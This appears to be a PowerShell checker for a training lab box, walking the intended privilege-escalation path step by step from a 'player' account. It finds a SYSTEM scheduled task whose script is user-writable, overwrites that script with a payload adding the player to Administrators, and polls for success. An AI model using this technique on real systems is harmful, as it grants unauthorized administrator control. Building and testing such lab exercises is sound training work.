# Engine 1 "foothold": walk the intended path exactly as a student would, from the player account.
"STEP 1 - who am I"
"  " + (whoami)

"STEP 2 - find a privileged scheduled task"
Get-ScheduledTask | Where-Object { $_.Principal.UserId -match "SYSTEM" -and $_.TaskName -notmatch "^Microsoft" } |
  ForEach-Object { "  task: " + $_.TaskName + "  runs as: " + $_.Principal.UserId }

"STEP 3 - what does it execute"
(Get-ScheduledTask -TaskName HexMaintenance).Actions | ForEach-Object { "  " + $_.Execute + " " + $_.Arguments }

"STEP 4 - can I write to that script"
$can = $false
try { Add-Content -Path C:\Scripts\maintenance.ps1 -Value "# probe" -ErrorAction Stop; $can = $true } catch {}
"  writable by me: $can"

"STEP 5 - replace it so SYSTEM adds me to Administrators"
Set-Content -Path C:\Scripts\maintenance.ps1 -Encoding ASCII -Value 'Add-LocalGroupMember -Group Administrators -Member player -ErrorAction SilentlyContinue'
"  payload written"

"STEP 6 - wait for the task to fire (runs every 2 minutes)"
$escalated = $false
for ($i = 0; $i -lt 20; $i++) {
  Start-Sleep -Seconds 15
  $admins = try { (Get-LocalGroupMember -Group Administrators -ErrorAction Stop | ForEach-Object { $_.Name }) -join "," } catch { "" }
  if ($admins -match "player") { $escalated = $true; "  ESCALATED after $(($i+1)*15)s - Administrators now: $admins"; break }
}
if (-not $escalated) { "  NOT escalated within 300s - the box is NOT completable by this path" }
